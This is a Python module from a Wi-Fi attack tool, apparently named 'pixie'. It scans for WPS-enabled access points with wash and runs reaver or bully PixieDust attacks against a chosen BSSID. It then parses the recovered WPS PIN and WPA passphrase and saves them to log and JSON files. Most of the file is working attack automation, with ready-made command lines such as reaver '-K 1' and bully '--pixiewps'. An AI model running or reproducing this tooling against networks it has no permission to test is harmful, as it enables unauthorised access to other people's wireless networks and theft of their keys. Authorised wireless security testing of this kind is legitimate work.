"""Optional online part: drive reaver/bully to *perform* a PixieDust attempt.

This is the only part of pixie that needs a monitor-mode interface, which
Termux cannot provide on its own.  It is therefore strictly opt-in (``pixie
hunt`` / ``pixie probe``) and refuses to run without the tools and, on POSIX,
without root.

Only the PixieDust path is wired in: reaver's ``-K 1`` / bully's
``--pixiewps``.  No PIN brute force, no handshake capture.
"""

from __future__ import annotations

import json
import os
import re
import time
from dataclasses import dataclass, field

from . import pixiewps, util

# ----------------------------------------------------------------- interfaces

_IW_INTERFACE = re.compile(r"^\s*Interface\s+(\S+)", re.MULTILINE)
_IW_TYPE = re.compile(r"^\s*type\s+(\S+)", re.MULTILINE)
_IW_CHANNEL = re.compile(r"^\s*channel\s+(\d+)", re.MULTILINE)
_IWCONFIG_MONITOR = re.compile(r"^(\S+)\s+.*Mode:Monitor", re.MULTILINE)
_IWCONFIG_NAME = re.compile(r"^(\S+)\s+IEEE 802\.11", re.MULTILINE)


def list_interfaces() -> list:
    """Return a list of {name, type, channel} dicts (best effort)."""
    interfaces = []
    if util.which("iw"):
        try:
            _, out = util.run([util.which("iw"), "dev"], timeout=15)
        except (util.PixieError, TimeoutError):
            out = ""
        blocks = re.split(r"^phy#\d+\s*$", out, flags=re.MULTILINE)
        for block in blocks[1:]:
            name = _IW_INTERFACE.search(block)
            if not name:
                continue
            iface_type = _IW_TYPE.search(block)
            channel = _IW_CHANNEL.search(block)
            interfaces.append({
                "name": name.group(1),
                "type": iface_type.group(1) if iface_type else "?",
                "channel": int(channel.group(1)) if channel else None,
            })
        if interfaces:
            return interfaces

    if util.which("iwconfig"):
        try:
            _, out = util.run([util.which("iwconfig")], timeout=15)
        except (util.PixieError, TimeoutError):
            out = ""
        for block in re.split(r"\n(?=\S)", out):
            name = _IWCONFIG_NAME.search(block)
            if not name:
                continue
            interfaces.append({
                "name": name.group(1),
                "type": "monitor" if "Mode:Monitor" in block else "managed",
                "channel": None,
            })
    return interfaces


def pick_interface(preferred: str | None = None) -> str:
    interfaces = list_interfaces()
    if preferred:
        for iface in interfaces:
            if iface["name"] == preferred:
                return preferred
        return preferred  # trust the user even if we cannot detect it
    monitors = [i["name"] for i in interfaces if i["type"] == "monitor"]
    if monitors:
        return monitors[0]
    if interfaces:
        raise util.PixieError(
            f"no interface in monitor mode found (saw: {', '.join(i['name'] for i in interfaces)})\n"
            "  start monitor mode first, e.g.: airmon-ng start wlan0  (or: iw dev wlan0 set type monitor)\n"
            "  and pass the result with --iface"
        )
    raise util.PixieError(
        "no wireless interface detected (is 'iw' installed? are you inside proot/Kali?)"
    )


def require_root() -> None:
    if os.name == "nt":
        return
    if not util.is_root():
        raise util.PixieError(
            "this needs root: monitor mode and frame injection are privileged\n"
            "  try: sudo python pixie probe --iface <iface> <bssid>"
        )


# ---------------------------------------------------------------------- wash


@dataclass
class AccessPoint:
    bssid: str
    channel: str = "?"
    rssi: str = "?"
    wps: str = "?"
    locked: str = "?"
    vendor: str = ""
    essid: str = ""

    def to_dict(self) -> dict:
        return {
            "bssid": self.bssid,
            "channel": self.channel,
            "rssi": self.rssi,
            "wps": self.wps,
            "locked": self.locked,
            "vendor": self.vendor,
            "essid": self.essid,
        }


_WASH_ROW = re.compile(
    r"^\s*([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})\s+(\S+)\s+(-?\d+)\s+(\S+)\s+(\S+)\s*(.*)$"
)


def parse_wash(text: str) -> list:
    access_points = []
    for line in text.splitlines():
        match = _WASH_ROW.match(line)
        if not match:
            continue
        bssid, channel, rssi, wps, locked, rest = match.groups()
        tokens = rest.split()
        vendor = tokens[0] if tokens and tokens[0].lower() not in ("no", "yes") else ""
        essid = " ".join(tokens[1:]) if vendor else rest.strip()
        access_points.append(AccessPoint(
            bssid=bssid.lower(),
            channel=channel,
            rssi=rssi,
            wps=wps,
            locked=locked,
            vendor=vendor,
            essid=essid,
        ))
    return access_points


def hunt(iface: str | None = None, timeout: int = 30, ui=None) -> tuple:
    """Scan for WPS-enabled access points through wash.

    Returns (access_points, raw_output).
    """
    binary = util.which("wash")
    if not binary:
        raise util.ToolMissing(
            "wash",
            hint="install the aircrack-ng/reaver suite (inside proot Kali: "
                 "apt install reaver), or use 'pixie pcap' on a capture instead",
        )
    interface = pick_interface(iface)
    argv = [binary, "-i", interface]
    if ui:
        ui.info(f"running: {' '.join(argv)}  (stopping after {timeout}s)")
    _, output = util.run_streaming(argv, on_line=None, timeout=timeout,
                                   echo=False, ui=ui)
    return parse_wash(output), output


# -------------------------------------------------------------------- attack


TOOL_COMMANDS = {
    "reaver": lambda iface, bssid: ["-i", iface, "-b", bssid, "-K", "1", "-vv"],
    "bully": lambda iface, bssid: ["-i", iface, "-b", bssid, "--pixiewps", "-v", "3"],
}


@dataclass
class AttackResult:
    bssid: str
    tool: str = ""
    pin: str | None = None
    psk: str | None = None
    ssid: str | None = None
    returncode: int = -1
    output: str = ""
    log_path: str = ""
    notes: list = field(default_factory=list)

    @property
    def success(self) -> bool:
        return bool(self.pin)

    def to_dict(self) -> dict:
        return {
            "bssid": self.bssid,
            "tool": self.tool,
            "pin": self.pin,
            "psk": self.psk,
            "ssid": self.ssid,
            "success": self.success,
            "returncode": self.returncode,
            "log": self.log_path,
            "notes": self.notes,
        }


def probe(iface: str | None = None, bssid: str = "", tool: str = "reaver",
          timeout: int = 300, ui=None, extra_args: list | None = None,
          workdir: str = "results") -> AttackResult:
    """Run a single PixieDust attempt against one BSSID."""
    bssid = util.validate_hex(bssid, "bssid", expected_bytes=6)
    bssid = ":".join(bssid[i:i + 2] for i in range(0, 12, 2))

    if tool not in TOOL_COMMANDS:
        raise util.PixieError(f"unknown tool '{tool}' (choose reaver or bully)")

    binary = util.which(tool)
    if not binary:
        raise util.ToolMissing(
            tool,
            hint="inside proot Kali: apt install reaver   (reaver ships wash too)",
        )

    require_root()
    interface = pick_interface(iface)

    argv = [binary] + TOOL_COMMANDS[tool](interface, bssid)
    if extra_args:
        argv += extra_args

    if ui:
        ui.info(f"running: {' '.join(argv)}")
        ui.info("PixieDust only - this stops as soon as reaver/bully gives up")

    result = AttackResult(bssid=bssid, tool=tool)
    try:
        rc, output = util.run_streaming(argv, on_line=None, timeout=timeout or None,
                                        echo=True, ui=ui)
    except util.ToolMissing:
        raise
    result.returncode = rc
    result.output = output

    parsed = pixiewps.parse_output(output)
    result.pin = parsed.pin
    result.psk = parsed.psk
    result.ssid = parsed.ssid

    if result.pin is None:
        lowered = output.lower()
        if "not vulnerable" in lowered or "failed to recover" in lowered:
            result.notes.append("device does not look vulnerable to PixieDust")
        elif timeout and rc is not None and rc != 0:
            result.notes.append(f"stopped after {timeout}s - try a longer --timeout")
    result.log_path = _save(result, output, workdir)
    return result


def _save(result: AttackResult, output: str, workdir: str) -> str:
    try:
        os.makedirs(workdir, exist_ok=True)
        stamp = time.strftime("%Y%m%d-%H%M%S")
        safe = result.bssid.replace(":", "")
        base = os.path.join(workdir, f"{stamp}-{safe}-{result.tool}")
        with open(base + ".log", "w", encoding="utf-8", errors="replace") as handle:
            handle.write(output)
        with open(base + ".json", "w", encoding="utf-8") as handle:
            json.dump(result.to_dict(), handle, indent=2)
        return base + ".json"
    except OSError:
        return ""
